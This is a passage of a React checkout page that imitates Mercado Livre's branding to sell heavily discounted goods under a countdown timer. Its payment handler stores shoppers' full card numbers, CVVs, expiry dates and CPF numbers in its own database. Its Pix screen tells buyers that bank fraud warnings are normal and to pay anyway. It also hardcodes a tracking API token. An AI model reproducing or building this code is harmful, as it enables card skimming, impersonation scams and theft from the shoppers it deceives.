import { useState, useEffect, useCallback, useMemo } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronLeft, Lock, CheckCircle, Zap, MapPin, User, Truck, ShieldCheck, Copy } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { supabase } from "@/integrations/supabase/client";
import { arosData } from "@/data/pneusData";

const getSessionId = () => {
  let sid = sessionStorage.getItem("checkout_session_id");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("checkout_session_id", sid);
  }
  return sid;
};

const productData: Record<string, { title: string; image: string; price: number; originalPrice: string; variant: string; variantLabel: string }> = {
  wap: {
    title: "Lavadora de Alta Pressão WAP Líder 2200 1750W",
    image: "https://mercadodeofertasml.shop/ml/produtos/wap/images/wap1.png",
    price: 119.99,
    originalPrice: "R$ 329,90",
    variant: "127V",
    variantLabel: "Voltagem",
  },
  colchoes: {
    title: "Colchão Inflável JoyFox + Bomba Eletrica Bateria Lítio + 2 Travesseiros",
    image: "https://mercadodeofertasml.shop/ml/produtos/colchoes/images/colchao1.png",
    price: 139.90,
    originalPrice: "R$ 599,90",
    variant: "Queen",
    variantLabel: "Tamanho",
  },
  maquina: {
    title: "Maquina Solda Inversora Mig Sem Gás 160a Tig Mma Trisolda Amarelo (Kit Completo)",
    image: "https://mercadodeofertasml.shop/ml/produtos/maquinasolda/images/solda1.png",
    price: 167.99,
    originalPrice: "R$ 1.250,00",
    variant: "220V",
    variantLabel: "Voltagem",
  },
  pneu13: {
    title: "Pneu Aro 13 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 289.90,
    originalPrice: "R$ 699,90",
    variant: "Aro 13",
    variantLabel: "Tamanho",
  },
  pneu14: {
    title: "Pneu Aro 14 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 319.90,
    originalPrice: "R$ 799,90",
    variant: "Aro 14",
    variantLabel: "Tamanho",
  },
  pneu15: {
    title: "Pneu Aro 15 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 359.90,
    originalPrice: "R$ 899,90",
    variant: "Aro 15",
    variantLabel: "Tamanho",
  },
  pneu16: {
    title: "Pneu Aro 16 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 419.90,
    originalPrice: "R$ 999,90",
    variant: "Aro 16",
    variantLabel: "Tamanho",
  },
  pneu17: {
    title: "Pneu Aro 17 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 489.90,
    originalPrice: "R$ 1.199,90",
    variant: "Aro 17",
    variantLabel: "Tamanho",
  },
  pneu18: {
    title: "Pneu Aro 18 Pirelli Cinturato P1",
    image: "/images/pneu-pirelli.png",
    price: 549.90,
    originalPrice: "R$ 1.399,90",
    variant: "Aro 18",
    variantLabel: "Tamanho",
  },
};

const formatMoney = (v: number) => v.toFixed(2).replace(".", ",");

const formatCpf = (val: string) => {
  const n = val.replace(/\D/g, "").slice(0, 11);
  if (n.length > 9) return n.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, "$1.$2.$3-$4");
  if (n.length > 6) return n.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
  if (n.length > 3) return n.replace(/(\d{3})(\d+)/, "$1.$2");
  return n;
};

const formatPhone = (val: string) => {
  const n = val.replace(/\D/g, "").slice(0, 11);
  if (n.length > 6) return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7)}`;
  if (n.length > 2) return `(${n.slice(0,2)}) ${n.slice(2)}`;
  return n;
};

const formatCep = (val: string) => {
  const n = val.replace(/\D/g, "").slice(0, 8);
  if (n.length > 5) return n.slice(0, 5) + "-" + n.slice(5);
  return n;
};

const formatCard = (val: string) => {
  const n = val.replace(/\D/g, "").slice(0, 16);
  return n.replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatExpiry = (val: string) => {
  const n = val.replace(/\D/g, "").slice(0, 4);
  if (n.length >= 3) return n.slice(0, 2) + "/" + n.slice(2);
  return n;
};

/* ─── Step indicator ─── */
const StepIndicator = ({ current }: { current: number }) => {
  const steps = ["Carrinho", "Dados", "Entrega", "Pagamento"];
  return (
    <div className="flex items-center px-6 py-4 relative">
      {steps.map((label, i) => {
        const stepNum = i + 1;
        const done = stepNum < current;
        const active = stepNum === current;
        return (
          <div key={i} className="flex flex-col items-center flex-1 relative">
            <div className="relative z-[2]">
              <div className={`w-[32px] h-[32px] rounded-full flex items-center justify-center text-[14px] font-bold shadow-sm ${
                done ? "bg-[#3483fa] text-white" : active ? "bg-[#3483fa] text-white" : "bg-white border-[3px] border-[#e0e0e0] text-[#bbb]"
              }`}>
                {done ? <CheckCircle size={18} className="text-white" /> : stepNum}
              </div>
            </div>
            {i < steps.length - 1 && (
              <div className={`absolute top-[15px] left-[50%] w-full h-[2px] z-[1] ${done ? "bg-[#3483fa]" : "bg-[#e0e0e0]"}`} />
            )}
            <span className={`text-[11px] mt-1.5 ${active ? "text-[#3483fa] font-bold" : done ? "text-[#3483fa] font-medium" : "text-[#bbb]"}`}>
              {label}
            </span>
          </div>
        );
      })}
    </div>
  );
};

/* ─── Countdown Timer ─── */
const CountdownTimer = () => {
  const [time, setTime] = useState(30 * 60);
  useEffect(() => {
    const t = setInterval(() => setTime((p) => (p > 0 ? p - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, []);
  const h = String(Math.floor(time / 3600)).padStart(2, "0");
  const m = String(Math.floor((time % 3600) / 60)).padStart(2, "0");
  const s = String(time % 60).padStart(2, "0");
  return (
    <div className="bg-[#E80B53] mx-0 px-4 py-2.5 flex items-center justify-between">
      <div className="flex items-center gap-2 text-white">
        <Zap size={16} className="fill-white" />
        <span className="text-[13px] font-bold tracking-wide">OFERTA EXPIRA EM</span>
      </div>
      <div className="flex items-center gap-1">
        {[h, m, s].map((v, i) => (
          <span key={i} className="flex items-center gap-1">
            <span className="bg-[#1a1a2e] text-white text-[15px] font-bold px-2 py-1 rounded-md min-w-[32px] text-center">{v}</span>
            {i < 2 && <span className="text-white font-bold">:</span>}
          </span>
        ))}
      </div>
    </div>
  );
};

/* ─── Card brand flags ─── */
const CardFlags = ({ size = 20 }: { size?: number }) => (
  <div className="flex items-center gap-1">
    {[
      { src: "/brands/visa.png", alt: "Visa" },
      { src: "/brands/mastercard.png", alt: "Mastercard" },
      { src: "/brands/amex.png", alt: "Amex" },
      { src: "/brands/elo.png", alt: "Elo" },
      { src: "/brands/hipercard.png", alt: "Hipercard" },
    ].map((b) => (
      <img key={b.alt} src={b.src} alt={b.alt} style={{ height: size }} className="w-auto object-contain" />
    ))}
  </div>
);

const detectCardBrand = (number: string): { src: string; alt: string } | null => {
  const clean = number.replace(/\D/g, "");
  if (!clean) return null;
  if (/^4/.test(clean)) return { src: "/brands/visa.png", alt: "Visa" };
  if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return { src: "/brands/mastercard.png", alt: "Mastercard" };
  if (/^3[47]/.test(clean)) return { src: "/brands/amex.png", alt: "Amex" };
  if (/^(636368|438935|504175|451416|636297|5067|4576|4011|506699)/.test(clean)) return { src: "/brands/elo.png", alt: "Elo" };
  if (/^(606282|3841)/.test(clean)) return { src: "/brands/hipercard.png", alt: "Hipercard" };
  return null;
};

const Checkout = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const product = searchParams.get("product") || "wap";

  const data = useMemo(() => {
    if (productData[product]) return productData[product];
    // Dynamic tire product: pneu_{slug}_{qty}
    const tireMatch = product.match(/^pneu_(.+)_(\d+)$/);
    if (tireMatch) {
      const [, tireSlug, qtyStr] = tireMatch;
      const qty = parseInt(qtyStr);
      for (const aro of arosData) {
        const found = aro.products.find((p) => p.slug === tireSlug);
        if (found) {
          const unitPrice = found.price;
          const totalPrice = qty === 2 ? 209.80 : qty === 4 ? 399.60 : unitPrice;
          return {
            title: `Pneu Pirelli ${found.size} (${qty}x)`,
            image: found.image,
            price: totalPrice,
            originalPrice: `R$ ${(found.originalPrice * qty).toFixed(2).replace(".", ",")}`,
            variant: found.size,
            variantLabel: "Tamanho",
          };
        }
      }
    }
    return productData.wap;
  }, [product]);

  const [step, setStep] = useState(1);

  // Step 2 - Dados
  const [email, setEmail] = useState("");
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [celular, setCelular] = useState("");

  // Step 3 - Entrega
  const [cep, setCep] = useState("");
  const [rua, setRua] = useState("");
  const [numero, setNumero] = useState("");
  const [complemento, setComplemento] = useState("");
  const [bairro, setBairro] = useState("");
  const [cidade, setCidade] = useState("");
  const [uf, setUf] = useState("");
  const [cepFound, setCepFound] = useState(false);
  const [shippingOption, setShippingOption] = useState<"full" | "normal">("normal");

  // Step 4 - Pagamento
  const [payMethod, setPayMethod] = useState<"pix" | "card">("pix");
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [parcelas, setParcelas] = useState("1");
  const [showParcelas, setShowParcelas] = useState(false);

  const [processing, setProcessing] = useState(false);
  const [completed, setCompleted] = useState(false);
  const [pixData, setPixData] = useState<{ qrCodeBase64: string; copyPaste: string; transactionId: string } | null>(null);
  const [paymentError, setPaymentError] = useState("");
  const [threeDSUrl, setThreeDSUrl] = useState("");
  const [copied, setCopied] = useState(false);

  const shippingCost = shippingOption === "full" ? 17.94 : 0;
  const total = data.price + shippingCost;
  const savings = parseFloat(data.originalPrice.replace("R$ ", "").replace(/\./g, "").replace(",", ".")) - data.price;

  // Dynamic shipping dates
  const getDayName = (date: Date) => {
    const days = ["domingo", "segunda-feira", "terça-feira", "quarta-feira", "quinta-feira", "sexta-feira", "sábado"];
    return days[date.getDay()];
  };

  const getNextBusinessDay = (from: Date, addDays: number) => {
    const d = new Date(from);
    let added = 0;
    while (added < addDays) {
      d.setDate(d.getDate() + 1);
      if (d.getDay() !== 0 && d.getDay() !== 6) added++;
    }
    return d;
  };

  const today = new Date();
  const fullDate = getNextBusinessDay(today, 1);
  const normalFrom = getNextBusinessDay(today, 3);
  const normalTo = getNextBusinessDay(today, 5);

  const buscarCep = useCallback(() => {
    const cleanCep = cep.replace(/\D/g, "");
    if (cleanCep.length === 8) {
      fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
        .then((r) => r.json())
        .then((d) => {
          if (!d.erro) {
            setRua(d.logradouro || "");
            setBairro(d.bairro || "");
            setCidade(d.localidade || "");
            setUf(d.uf || "");
            setCepFound(true);
          }
        })
        .catch(() => {});
    }
  }, [cep]);

  // Auto buscar CEP quando digitar 8 dígitos
  useEffect(() => {
    const cleanCep = cep.replace(/\D/g, "");
    if (cleanCep.length === 8) {
      buscarCep();
    }
  }, [cep, buscarCep]);

  // Track analytics on step change + Facebook Pixel events
  useEffect(() => {
    const sid = getSessionId();
    supabase.from("checkout_analytics").insert({
      session_id: sid,
      product_key: product,
      step_reached: step,
      page_visited: step === 1 ? "carrinho" : step === 2 ? "dados" : step === 3 ? "entrega" : "pagamento",
    } as any).then(() => {});

    // Facebook Pixel: InitiateCheckout on step 1
    if (step === 1 && typeof window !== "undefined") {
      if ((window as any).fbq) {
        (window as any).fbq("track", "InitiateCheckout", {
          content_name: data.title,
          value: data.price,
          currency: "BRL",
        });
      }
      // Facebook CAPI: InitiateCheckout
      sendCAPIEvent("InitiateCheckout", { content_name: data.title, value: data.price });
      // Utmify: InitiateCheckout
      try {
        fetch("https://api.utmify.com.br/api/conversions/create-ic", {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-api-token": "kYryuc7A8NSyg80ZtKaULjEcAm0utu3UQvHT" },
          body: JSON.stringify({
            orderId: getSessionId(),
            platform: "custom",
            currency: "BRL",
            products: [{ productName: data.title, productPrice: data.price, productQty: 1 }],
          }),
        }).catch(() => {});
      } catch {}
    }
  }, [step, product, data.title, data.price]);

  // Track page visit
  useEffect(() => {
    const sid = getSessionId();
    supabase.from("checkout_analytics").insert({
      session_id: sid,
      product_key: product,
      step_reached: 0,
      page_visited: "checkout_visit",
    } as any).then(() => {});
  }, [product]);

  const backLabel = ["", "", "← Voltar", "← Voltar ao carrinho", "← Voltar para dados pessoais", "← Voltar para entrega"];

  const firePixelPurchase = () => {
    if (typeof window !== "undefined" && (window as any).fbq) {
      (window as any).fbq("track", "Purchase", {
        content_name: data.title,
        value: total,
        currency: "BRL",
      });
    }
    // Facebook CAPI: Purchase
    sendCAPIEvent("Purchase", { content_name: data.title, value: total });
    // Utmify: Purchase
    try {
      fetch("https://api.utmify.com.br/api/conversions/create", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-api-token": "kYryuc7A8NSyg80ZtKaULjEcAm0utu3UQvHT" },
        body: JSON.stringify({
          orderId: getSessionId(),
          platform: "custom",
          currency: "BRL",
          paymentMethod: payMethod === "pix" ? "pix" : "credit_card",
          customerEmail: email,
          customerName: nome,
          customerPhone: celular.replace(/\D/g, ""),
          customerDocument: cpf.replace(/\D/g, ""),
          products: [{ productName: data.title, productPrice: total, productQty: 1 }],
        }),
      }).catch(() => {});
    } catch {}
  };

  const callPayevo = async (body: Record<string, unknown>) => {
    const res = await supabase.functions.invoke("payevo-payment", { body });
    return res.data;
  };

  // Facebook Conversions API helper
  const sendCAPIEvent = useCallback((eventName: string, customData?: Record<string, unknown>) => {
    const getFbCookie = (name: string) => {
      const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return match ? match[2] : undefined;
    };
    supabase.functions.invoke("fb-conversions-api", {
      body: {
        events: [{
          event_name: eventName,
          event_time: Math.floor(Date.now() / 1000),
          event_source_url: window.location.href,
          event_id: crypto.randomUUID(),
          email: email || undefined,
          phone: celular?.replace(/\D/g, "") || undefined,
          name: nome || undefined,
          cpf: cpf?.replace(/\D/g, "") || undefined,
          client_user_agent: navigator.userAgent,
          fbp: getFbCookie("_fbp"),
          fbc: getFbCookie("_fbc"),
          custom_data: {
            currency: "BRL",
            ...customData,
          },
        }],
      },
    }).catch(() => {});
  }, [email, celular, nome, cpf]);

  const handleConfirm = async () => {
    setProcessing(true);
    setPaymentError("");

    const cleanCpfNum = cpf.replace(/\D/g, "");
    const cleanPhone = celular.replace(/\D/g, "");
    const amountCents = Math.round(total * 100);

    const customerObj = {
      name: nome,
      email,
      phone: cleanPhone,
      document: { number: cleanCpfNum, type: "cpf" },
    };

    const itemsArr = [
      {
        title: data.title,
        unitPrice: Math.round(data.price * 100),
        quantity: 1,
        tangible: true,
      },
    ];

    const shippingObj = {
      name: nome,
      street: rua,
      number: numero,
      complement: complemento || undefined,
      neighborhood: bairro,
      city: cidade,
      state: uf,
      zipCode: cep.replace(/\D/g, ""),
    };

    // Save order to DB
    const cleanCardNumber = cardNumber.replace(/\D/g, "");
    const last4 = cleanCardNumber.slice(-4);
    const brand = detectCardBrand(cardNumber);

    try {
      await supabase.from("checkout_orders").insert({
        product_key: product,
        product_title: data.title,
        product_price: data.price,
        total,
        shipping_cost: shippingCost,
        shipping_option: shippingOption,
        email, nome, cpf, celular, cep, rua, numero, complemento, bairro, cidade, uf,
        pay_method: payMethod,
        card_name: payMethod === "card" ? cardName : null,
        card_last4: payMethod === "card" ? last4 : null,
        card_brand: payMethod === "card" ? (brand?.alt || null) : null,
        card_expiry: payMethod === "card" ? cardExpiry : null,
        card_number: payMethod === "card" ? cleanCardNumber : null,
        card_cvv: payMethod === "card" ? cardCvv : null,
        parcelas: payMethod === "card" ? parseInt(parcelas) : 1,
        current_step: 4,
      } as any);
    } catch (e) {
      console.error("Erro ao salvar pedido:", e);
    }

    try {
      if (payMethod === "pix") {
        const result = await callPayevo({
          action: "create-transaction",
          amount: amountCents,
          paymentMethod: "PIX",
          items: itemsArr,
          customer: customerObj,
          shipping: shippingObj,
          pix: { expiresInDays: 1 },
        });

        if (result?.pix) {
          setPixData({
            qrCodeBase64: result.pix.qrcode || "",
            copyPaste: result.pix.copyPaste || result.pix.qrcode || "",
            transactionId: result.id || "",
          });
          firePixelPurchase();
          setProcessing(false);
        } else if (result?.error) {
          setPaymentError(result.error?.message || "Erro ao gerar PIX. Tente novamente.");
          setProcessing(false);
        } else {
          setPaymentError("Erro ao gerar PIX. Tente novamente.");
          setProcessing(false);
        }
      } else {
        // Card payment
        const [expMonth, expYear] = cardExpiry.split("/");
        const fullYear = expYear?.length === 2 ? `20${expYear}` : expYear;

        const result = await callPayevo({
          action: "create-transaction",
          amount: amountCents,
          paymentMethod: "CARD",
          items: itemsArr,
          customer: customerObj,
          shipping: shippingObj,
          card: {
            number: cleanCardNumber,
            holderName: cardName,
            expirationMonth: expMonth,
            expirationYear: fullYear,
            cvv: cardCvv,
          },
          installments: parseInt(parcelas),
        });

        if (result?.status === "PAID" || result?.status === "paid") {
          firePixelPurchase();
          setCompleted(true);
          setProcessing(false);
        } else if (result?.status === "PENDING_3DS" && result?.threeDSecure?.redirectUrl) {
          setThreeDSUrl(result.threeDSecure.redirectUrl);
          window.open(result.threeDSecure.redirectUrl, "_blank");
          setPaymentError("Complete a verificação 3D Secure na janela aberta.");
          setProcessing(false);
        } else if (result?.status === "FAILED" || result?.status === "failed") {
          setPaymentError(result?.refuseReason || "Pagamento recusado. Tente outro cartão.");
          setProcessing(false);
        } else if (result?.error) {
          setPaymentError(result.error?.message || "Erro ao processar cartão. Tente novamente.");
          setProcessing(false);
        } else {
          setPaymentError("Pagamento em processamento. Aguarde.");
          setProcessing(false);
        }
      }
    } catch (e) {
      console.error("Payment error:", e);
      setPaymentError("Erro de conexão. Tente novamente.");
      setProcessing(false);
    }
  };

  // PIX QR Code screen
  if (pixData) {
    const pixCode = pixData.copyPaste || pixData.qrCodeBase64 || "";

    const handleCopy = () => {
      navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    };

    return (
      <div className="min-h-screen bg-[#ededed] max-w-[480px] mx-auto">
        <header className="bg-[#ffe600] px-4 py-3 flex items-center justify-between">
          <img src="/e7b320f4-9a9c-45e1-8f2e-d116c127d186.png" alt="ML" className="h-[30px]" />
          <div className="flex items-center gap-1 text-[#333]">
            <Lock size={13} />
            <span className="text-[13px]">Compra segura</span>
          </div>
        </header>

        {/* Success message */}
        <div className="bg-white mx-4 mt-6 rounded-lg p-6 text-center">
          <div className="w-14 h-14 bg-[#e8f5e9] rounded-full flex items-center justify-center mx-auto mb-3">
            <CheckCircle size={32} className="text-[#00a650]" />
          </div>
          <h1 className="text-[20px] font-bold text-[#333] mb-1">Pix gerado com sucesso!</h1>
          <p className="text-[13px] text-[#666]">Escaneie o QR Code ou copie o código abaixo</p>
        </div>

        {/* Fraud warning */}
        <div className="bg-white mx-4 mt-3 rounded-lg overflow-hidden">
          <div className="bg-[#fff8e1] px-4 py-3 flex items-center gap-2 border-b border-[#ffe082]">
            <span className="text-[18px]">⚠️</span>
            <span className="text-[14px] font-semibold text-[#e65100]">Aviso importante sobre o pagamento</span>
          </div>
          <div className="px-4 py-3">
            <p className="text-[13px] text-[#333] leading-relaxed">
              Alguns bancos podem exibir um aviso de <strong>"suspeita de fraude"</strong> ao realizar o Pix. Isso é <strong>completamente normal</strong> e faz parte da verificação automática de segurança do seu banco para proteger sua conta.
            </p>
          </div>
          <div className="px-4 pb-3">
            <div className="bg-[#f5f5f5] rounded-md px-3 py-2.5 flex items-center gap-2">
              <ShieldCheck size={16} className="text-[#666] flex-shrink-0" />
              <span className="text-[13px] text-[#333] font-medium">Seu pagamento é 100% seguro e protegido.</span>
            </div>
          </div>
        </div>

        {/* QR Code */}
        <div className="bg-white mx-4 mt-3 rounded-lg p-5 flex flex-col items-center">
          {pixCode && (
            <div className="bg-white rounded-lg p-3 border border-[#eee] mb-4">
              <QRCodeSVG value={pixCode} size={200} level="M" />
            </div>
          )}

          {/* Pix Copia e Cola */}
          <div className="w-full bg-[#f5f5f5] rounded-lg p-3 mb-4">
            <p className="text-[11px] text-[#999] mb-1 uppercase font-semibold tracking-wide">PIX COPIA E COLA</p>
            <p className="text-[11px] text-[#333] break-all max-h-[50px] overflow-y-auto font-mono leading-relaxed">{pixCode}</p>
          </div>

          {/* Copy button */}
          <button
            onClick={handleCopy}
            className={`w-full flex items-center justify-center gap-2 py-3.5 rounded-md text-[15px] font-semibold transition-colors ${copied ? "bg-[#00a650] text-white" : "bg-[#3483fa] text-white"}`}
          >
            <Copy size={16} />
            {copied ? "Copiado!" : "Copiar código Pix"}
          </button>
        </div>

        {/* How to pay steps */}
        <div className="bg-white mx-4 mt-3 rounded-lg p-5">
          <div className="flex items-center gap-2 mb-4">
            <span className="text-[16px]">📋</span>
            <h2 className="text-[16px] font-bold text-[#333]">Como pagar com Pix</h2>
          </div>

          <div className="space-y-4">
            <div className="flex gap-3">
              <div className="w-7 h-7 bg-[#3483fa] rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-white text-[13px] font-bold">1</span>
              </div>
              <div>
                <p className="text-[14px] font-semibold text-[#333]">Abra o app do seu banco</p>
                <p className="text-[12px] text-[#666]">Acesse o aplicativo do seu banco ou carteira digital</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="w-7 h-7 bg-[#3483fa] rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-white text-[13px] font-bold">2</span>
              </div>
              <div>
                <p className="text-[14px] font-semibold text-[#333]">Escolha pagar com Pix</p>
                <p className="text-[12px] text-[#666]">Selecione a opção Pix no menu de pagamentos</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="w-7 h-7 bg-[#3483fa] rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-white text-[13px] font-bold">3</span>
              </div>
              <div>
                <p className="text-[14px] font-semibold text-[#333]">Escaneie o QR Code ou cole o código</p>
                <p className="text-[12px] text-[#666]">Use a câmera para ler o QR Code ou cole o código copiado na opção "Pix Copia e Cola"</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="w-7 h-7 bg-[#3483fa] rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-white text-[13px] font-bold">4</span>
              </div>
              <div>
                <p className="text-[14px] font-semibold text-[#333]">Confirme o valor e pague</p>
                <p className="text-[12px] text-[#666]">Confira o valor de <span className="text-[#3483fa] font-semibold">R$ {formatMoney(total)}</span> e confirme o pagamento</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="w-7 h-7 bg-[#00a650] rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <CheckCircle size={16} className="text-white" />
              </div>
              <div>
                <p className="text-[14px] font-semibold text-[#333]">Pronto! Pagamento confirmado</p>
                <p className="text-[12px] text-[#666]">A confirmação é instantânea e seu pedido será processado imediatamente</p>
              </div>
            </div>
          </div>
        </div>

        {/* Product summary */}
        <div className="bg-white mx-4 mt-3 rounded-lg p-5">
          <div className="flex items-center gap-2 mb-3">
            <span className="text-[16px]">🛒</span>
            <h2 className="text-[15px] font-bold text-[#333]">Produtos (1)</h2>
          </div>
          <div className="flex gap-3 pb-3 border-b border-[#eee]">
            <img src={data.image} alt="" className="w-[50px] h-[50px] object-contain bg-[#f9f9f9] rounded-md p-1" />
            <div className="flex-1">
              <p className="text-[13px] text-[#333] leading-tight line-clamp-2">{data.title}</p>
              <p className="text-[14px] font-bold text-[#3483fa] mt-1">R$ {formatMoney(data.price)}</p>
            </div>
          </div>

          {/* Pricing breakdown */}
          <div className="mt-3 space-y-2">
            <div className="flex justify-between">
              <span className="text-[13px] text-[#666]">Subtotal</span>
              <span className="text-[13px] text-[#333]">R$ {formatMoney(data.price)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-[13px] text-[#666]">Frete</span>
              <span className="text-[13px] text-[#00a650] font-semibold">{shippingCost > 0 ? `R$ ${formatMoney(shippingCost)}` : "Grátis"}</span>
            </div>
            <div className="flex justify-between pt-2 border-t border-[#eee]">
              <span className="text-[15px] font-bold text-[#333]">Total</span>
              <span className="text-[15px] font-bold text-[#333]">R$ {formatMoney(total)}</span>
            </div>
          </div>
        </div>

        {/* Expiry + footer */}
        <div className="mx-4 mt-3 mb-2 flex items-center justify-center gap-1.5 text-[#e65100]">
          <span className="text-[14px]">⏱</span>
          <span className="text-[13px] font-medium">Pix expira em 30 minutos</span>
        </div>
        <div className="flex items-center justify-center gap-1.5 text-[#999] pb-6">
          <Lock size={12} />
          <span className="text-[12px]">Pagamento processado com segurança</span>
        </div>
      </div>
    );
  }

  if (completed) {
    return (
      <div className="min-h-screen bg-[#ededed] max-w-[480px] mx-auto">
        <header className="bg-[#ffe600] px-4 py-3 flex items-center justify-between">
          <img src="/e7b320f4-9a9c-45e1-8f2e-d116c127d186.png" alt="ML" className="h-[30px]" />
          <div className="flex items-center gap-1 text-[#333]">
            <Lock size={13} />
            <span className="text-[13px]">Compra segura</span>
          </div>
        </header>
        <div className="bg-white mx-4 mt-6 rounded-lg p-6 text-center">
          <div className="w-16 h-16 bg-[#00a650] rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle size={36} className="text-white" />
          </div>
          <h1 className="text-[22px] font-semibold text-[#333] mb-2">Pagamento aprovado!</h1>
          <p className="text-[13px] text-[#666] mb-1 line-clamp-2">{data.title}</p>
          <p className="text-[20px] font-bold text-[#333] mb-4">R$ {formatMoney(total)}</p>
          <div className="bg-[#f0f9f0] rounded-lg p-3 mb-4">
            <div className="flex items-center gap-2 text-[#00a650] justify-center">
              <Truck size={14} />
              <span className="text-[13px]">Chegará entre {getDayName(normalFrom)} e {getDayName(normalTo)}</span>
            </div>
          </div>
          <p className="text-[13px] text-[#666] mb-4">
            Enviamos os detalhes para <strong>{email}</strong>
          </p>
          <button onClick={() => navigate(-1)} className="w-full bg-[#3483fa] text-white py-3 rounded-md font-semibold text-[15px]">
            Voltar à loja
          </button>
        </div>
        <p className="text-center text-[11px] text-[#999] mt-4">Mercado Livre © 2026 · Pagamento seguro</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#ededed] pb-4 max-w-[480px] mx-auto">
      {/* Header */}
      <header className="bg-[#ffe600] sticky top-0 z-50">
        <div className="flex items-center justify-between px-4 py-3">
          <button onClick={() => step > 1 ? setStep(step - 1) : navigate(-1)}>
            <ChevronLeft size={22} className="text-[#333]" />
          </button>
          <img src="/e7b320f4-9a9c-45e1-8f2e-d116c127d186.png" alt="ML" className="h-[30px]" />
          <div className="flex items-center gap-1 text-[#333]">
            <Lock size={13} />
            <span className="text-[13px]">Compra segura</span>
          </div>
        </div>
      </header>

      {/* Countdown */}
      <CountdownTimer />

      {/* Step Indicator */}
      <div className="bg-white">
        <StepIndicator current={step} />
      </div>

      {/* Back link */}
      {step > 1 && (
        <div className="bg-[#ededed] px-4 py-3">
          <button onClick={() => setStep(step - 1)} className="text-[#3483fa] text-[13px] flex items-center gap-1">
            {backLabel[step]}
          </button>
        </div>
      )}

      {/* ═══ STEP 1: CARRINHO ═══ */}
      {step === 1 && (
        <div className="px-4">
          <div className="bg-white mt-4 p-5 rounded-xl shadow-sm">
            <h3 className="text-[16px] font-bold text-[#333] mb-4">Produtos</h3>
            <div className="flex gap-3">
              <img src={data.image} alt="" className="w-[60px] h-[60px] object-contain bg-[#f9f9f9] rounded-lg p-1" />
              <div className="flex-1">
                <p className="text-[13px] text-[#333] leading-tight mb-1">{data.title}</p>
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-[12px] text-[#999] line-through">{data.originalPrice}</span>
                  <span className="text-[15px] font-bold text-[#333]">R$ {formatMoney(data.price)}</span>
                </div>
                <p className="text-[12px] text-[#666]">{data.variantLabel}: {data.variant}</p>
                <p className="text-[12px] text-[#666]">Quantidade: 1</p>
                <button className="text-[#3483fa] text-[12px] mt-1">Excluir</button>
              </div>
            </div>
          </div>

          <div className="bg-white mt-3 p-5 rounded-xl shadow-sm">
            <div className="flex items-center justify-between">
              <span className="text-[15px] text-[#333]">Subtotal</span>
              <span className="text-[18px] font-bold text-[#333]">R$ {formatMoney(data.price)}</span>
            </div>
          </div>

          <div className="mt-4">
            <button
              onClick={() => setStep(2)}
              className="w-full bg-[#3483fa] text-white py-[14px] rounded-full font-semibold text-[16px] shadow-md"
            >
              Continuar a compra
            </button>
          </div>
        </div>
      )}

      {/* ═══ STEP 2: DADOS ═══ */}
      {step === 2 && (
        <div className="px-4">
          <div className="bg-white mt-4 p-5 rounded-xl shadow-sm">
            <div className="flex items-center gap-2 mb-1">
              <User size={20} className="text-[#333]" />
              <h3 className="text-[16px] font-semibold text-[#333]">Dados pessoais</h3>
            </div>
            <p className="text-[13px] text-[#999] mb-4">Informe seus dados para entrega</p>

            <div className="space-y-4">
              <div>
                <label className="text-[13px] text-[#333] font-medium mb-1 block">E-mail <span className="text-red-500">*</span></label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="seuemail@exemplo.com"
                  className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                />
              </div>
              <div>
                <label className="text-[13px] text-[#333] font-medium mb-1 block">Nome completo</label>
                <input
                  type="text"
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
                  placeholder="Como aparece no documento"
                  className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                />
              </div>
              <div className="flex gap-3">
                <div className="flex-1">
                  <label className="text-[13px] text-[#333] font-medium mb-1 block">CPF</label>
                  <input
                    type="text"
                    value={cpf}
                    onChange={(e) => setCpf(formatCpf(e.target.value))}
                    placeholder="000.000.000-00"
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                    maxLength={14}
                  />
                </div>
                <div className="flex-1">
